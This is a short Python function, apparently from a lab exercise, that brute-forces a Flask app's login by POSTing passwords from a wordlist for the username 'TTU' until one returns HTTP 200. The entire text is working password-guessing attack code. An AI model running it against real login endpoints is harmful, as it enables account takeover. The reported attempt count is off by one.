def run_test():
    print(f"--- Starting Brute Force Test on {URL} ---")
    
    start_time = time.time()
    attempts = 0
    with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
        for line in file:
            attempts += 1
            password = line.strip() # Remove the newline character
                
            payload = {
                "username": "TTU",
                "password": password
            }
        
            try:
                # Send the POST request to Flask app
                response = requests.post(URL, json=payload, timeout=5)
                
                if response.status_code == 200:
                    elapsed = time.time() - start_time
                    print(f"[SUCCESS] Cracked! Password found: '{password}'")
                    print(f"Attempts: {attempts + 1} | Time taken: {elapsed:.2f} seconds")
                    return
                else:
                    print(f"[FAILED] Tried: {password} | Status: {response.status_code}")
                    
            except requests.exceptions.ConnectionError:
                print("Error: Could not connect to Flask. Is it running?")
                return
